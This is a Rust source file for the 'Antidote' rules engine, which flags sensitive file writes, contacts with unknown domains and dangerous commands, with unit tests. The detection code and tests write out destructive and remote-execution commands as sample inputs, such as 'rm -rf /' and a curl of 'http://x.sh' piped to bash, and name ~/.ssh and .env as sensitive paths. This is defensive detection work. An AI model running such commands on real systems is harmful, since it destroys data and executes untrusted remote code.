//! Rules engine for Antidote

mod config;
mod rules;
mod state;

pub use config::{RulesConfig, Thresholds, TimeWindows};
pub use state::SessionState;

use antidote_core::{Event, EventType, Flag};
use anyhow::{Context, Result};
use globset::{Glob, GlobSet, GlobSetBuilder};
use std::fs;
use time::Duration;

/// Rule engine that evaluates events and produces flags
pub struct RuleEngine {
    config: RulesConfig,
    sensitive_globset: GlobSet,
    benign_globset: GlobSet,
}

impl RuleEngine {
    /// Load rules from a YAML file
    pub fn load_from_file(path: &str) -> Result<Self> {
        let content = fs::read_to_string(path)
            .with_context(|| format!("Failed to read rules file: {}", path))?;

        let config: RulesConfig = serde_yaml::from_str(&content)
            .with_context(|| format!("Failed to parse rules YAML: {}", path))?;

        let mut sensitive_builder = GlobSetBuilder::new();
        for glob_str in &config.sensitive_path_globs {
            let expanded = if glob_str.starts_with("~/") {
                let home = std::env::var("HOME").unwrap_or_else(|_| "~".to_string());
                glob_str.replacen("~", &home, 1)
            } else {
                glob_str.clone()
            };
            let glob = Glob::new(&expanded)
                .with_context(|| format!("Invalid glob pattern: {}", glob_str))?;
            sensitive_builder.add(glob);
        }
        let sensitive_globset = sensitive_builder
            .build()
            .context("Failed to build sensitive globset")?;

        let mut benign_builder = GlobSetBuilder::new();
        for glob_str in &config.benign_path_globs {
            if let Ok(glob) = Glob::new(glob_str) {
                benign_builder.add(glob);
            }
        }
        let benign_globset = benign_builder
            .build()
            .unwrap_or_else(|_| GlobSet::empty());

        Ok(Self {
            config,
            sensitive_globset,
            benign_globset,
        })
    }

    /// Create a rule engine with default config (for testing)
    pub fn with_default_config() -> Self {
        let config = RulesConfig::default();
        let mut sensitive_builder = GlobSetBuilder::new();
        for glob_str in &config.sensitive_path_globs {
            if let Ok(glob) = Glob::new(glob_str) {
                sensitive_builder.add(glob);
            }
        }
        let sensitive_globset = sensitive_builder.build().unwrap_or_else(|_| GlobSet::empty());

        let mut benign_builder = GlobSetBuilder::new();
        for glob_str in &config.benign_path_globs {
            if let Ok(glob) = Glob::new(glob_str) {
                benign_builder.add(glob);
            }
        }
        let benign_globset = benign_builder.build().unwrap_or_else(|_| GlobSet::empty());

        Self {
            config,
            sensitive_globset,
            benign_globset,
        }
    }

    pub fn known_domains(&self) -> &[String] {
        &self.config.known_domains
    }

    pub(crate) fn config(&self) -> &RulesConfig {
        &self.config
    }

    /// Check if a path matches benign globs (Phase 3)
    pub(crate) fn is_benign_path(&self, path: &str) -> bool {
        self.benign_globset.is_match(path)
    }

    /// Check if a domain is known (exact match or subdomain)
    pub(crate) fn is_known_domain(&self, domain: &str) -> bool {
        self.config.known_domains.iter().any(|known| {
            domain == known || domain.ends_with(&format!(".{}", known))
        })
    }

    /// Check if a path matches sensitive globs
    pub(crate) fn is_sensitive_path(&self, path: &str) -> bool {
        let expanded = if path.starts_with("~/") {
            let home = std::env::var("HOME").unwrap_or_else(|_| "~".to_string());
            path.replacen("~", &home, 1)
        } else {
            path.to_string()
        };
        self.sensitive_globset.is_match(&expanded)
    }

    /// Check if a command is dangerous
    pub(crate) fn is_dangerous_command(&self, argv: &[String]) -> bool {
        if argv.is_empty() {
            return false;
        }
        let cmd = argv[0].as_str();
        let args_str = argv.join(" ");
        if cmd == "rm" && args_str.contains("-rf") {
            return true;
        }
        if (cmd == "curl" || cmd == "wget")
            && (args_str.contains("| sh") || args_str.contains("| bash"))
        {
            return true;
        }
        if cmd == "chmod" && args_str.contains("777") {
            return true;
        }
        false
    }

    /// Evaluate an event and produce flags
    pub fn evaluate_event(&self, event: &Event, session: &mut SessionState) -> Vec<Flag> {
        let now = event.ts;

        session.event_timestamps.push(now);
        let cutoff = now - Duration::minutes(5);
        session.event_timestamps.retain(|&ts| ts >= cutoff);

        match event.event_type {
            EventType::FileWrite => {
                session.counts.files_written += 1;
                session.counts.events_total += 1;
                if let Some(path) = event.payload.get("path").and_then(|v| v.as_str()) {
                    if self.is_sensitive_path(path) {
                        session
                            .sensitive_writes
                            .push((path.to_string(), now));
                        let cutoff_sw =
                            now - Duration::seconds(self.config.time_windows.sensitive_burst_window_seconds as i64);
                        session
                            .sensitive_writes
                            .retain(|(_, ts)| *ts >= cutoff_sw);
                    }
                }
            }
            EventType::FileDelete => {
                session.counts.files_deleted += 1;
                session.counts.events_total += 1;
            }
            EventType::FileCreate | EventType::FileRename => {
                session.counts.files_written += 1;
                session.counts.events_total += 1;
            }
            EventType::FileRead => {
                session.counts.files_read += 1;
                session.counts.events_total += 1;
            }
            EventType::NetHttp => {
                session.counts.events_total += 1;
                if let Some(domain) = event.payload.get("domain").and_then(|v| v.as_str()) {
                    session.counts.domains += 1;
                    if let Some(bytes_out) = event.payload.get("bytes_out").and_then(|v| v.as_u64()) {
                        session.counts.bytes_out += bytes_out;
                    }
                    if !self.is_known_domain(domain) {
                        session
                            .unknown_domain_contacts
                            .push((domain.to_string(), now));
                        let cutoff = now
                            - Duration::seconds(
                                self.config.time_windows.unknown_domains_window_seconds as i64,
                            );
                        session
                            .unknown_domain_contacts
                            .retain(|(_, ts)| *ts >= cutoff);
                    }
                }
            }
            EventType::CmdExec => {
                session.counts.cmds += 1;
                session.counts.events_total += 1;
            }
            EventType::Tick | EventType::Heartbeat => {}
            _ => {
                session.counts.events_total += 1;
            }
        }

        let flags = rules::evaluate_event_driven(self, event, session);

        for flag in &flags {
            session.flags.push(flag.clone());
            session.labels.insert(flag.label);
        }

        flags
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use antidote_core::{EventType, RiskBucket};
    use time::OffsetDateTime;
    use uuid::Uuid;

    #[test]
    fn test_risk_bucket_boundaries() {
        let low = antidote_core::RiskSummary::new(30);
        assert_eq!(low.bucket, RiskBucket::Low);
        assert_eq!(low.score, 30);

        let medium = antidote_core::RiskSummary::new(31);
        assert_eq!(medium.bucket, RiskBucket::Medium);
        assert_eq!(medium.score, 31);

        let high = antidote_core::RiskSummary::new(61);
        assert_eq!(high.bucket, RiskBucket::High);
        assert_eq!(high.score, 61);

        let clamped = antidote_core::RiskSummary::new(150);
        assert_eq!(clamped.bucket, RiskBucket::High);
        assert_eq!(clamped.score, 100);
    }

    #[test]
    fn test_rule_hit_caps() {
        let mut session = SessionState::new("test".to_string(), "test".to_string());
        let engine = RuleEngine::with_default_config();

        let event = Event {
            id: Uuid::new_v4(),
            ts: OffsetDateTime::now_utc(),
            session_id: "test".to_string(),
            event_type: EventType::CmdExec,
            payload: serde_json::json!({
                "argv": ["rm", "-rf", "/"]
            }),
            enforcement_action: false,
        };

        for _ in 0..3 {
            let flags = engine.evaluate_event(&event, &mut session);
            assert!(!flags.is_empty());
        }

        let flags = engine.evaluate_event(&event, &mut session);
        assert!(flags.is_empty());
    }

    #[test]
    fn test_sensitive_path_matching() {
        let mut config = RulesConfig::default();
        config.sensitive_path_globs = vec!["**/.env".to_string(), "~/.ssh/**".to_string()];

        let mut builder = GlobSetBuilder::new();
        for glob_str in &config.sensitive_path_globs {
            let expanded = if glob_str.starts_with("~/") {
                let home = std::env::var("HOME").unwrap_or_else(|_| "~".to_string());
                glob_str.replacen("~", &home, 1)
            } else {
                glob_str.clone()
            };
            if let Ok(glob) = Glob::new(&expanded) {
                builder.add(glob);
            }
        }
        let globset = builder.build().unwrap();

        let engine = RuleEngine {
            config: config.clone(),
            sensitive_globset: globset,
            benign_globset: GlobSet::empty(),
        };

        assert!(engine.is_sensitive_path("/project/.env"));
        assert!(engine.is_sensitive_path("/deep/nested/.env"));
        assert!(!engine.is_sensitive_path("/project/.env.backup"));
    }

    #[test]
    fn test_unknown_domain_detection() {
        let mut config = RulesConfig::default();
        config.known_domains = vec!["api.openai.com".to_string(), "github.com".to_string()];

        let engine = RuleEngine {
            config,
            sensitive_globset: GlobSet::empty(),
            benign_globset: GlobSet::empty(),
        };

        assert!(engine.is_known_domain("api.openai.com"));
        assert!(engine.is_known_domain("sub.api.openai.com"));
        assert!(engine.is_known_domain("github.com"));
        assert!(!engine.is_known_domain("evil.example"));
        assert!(!engine.is_known_domain("malicious.com"));
    }

    #[test]
    fn test_dangerous_command_detection() {
        let engine = RuleEngine::with_default_config();

        assert!(engine.is_dangerous_command(&[
            "rm".to_string(),
            "-rf".to_string(),
            "/".to_string()
        ]));
        assert!(engine.is_dangerous_command(&[
            "curl".to_string(),
            "http://x.sh".to_string(),
            "|".to_string(),
            "bash".to_string()
        ]));
        assert!(engine.is_dangerous_command(&[
            "chmod".to_string(),
            "777".to_string(),
            "file".to_string()
        ]));
        assert!(!engine.is_dangerous_command(&["ls".to_string(), "-la".to_string()]));
    }

    #[test]
    fn test_evidence_caps() {
        let mut evidence = antidote_core::Evidence::default();
        for i in 0..15 {
            evidence.add_sensitive_path(format!("/path/{}", i));
        }
        assert_eq!(evidence.sensitive_paths.len(), 10);
    }
}
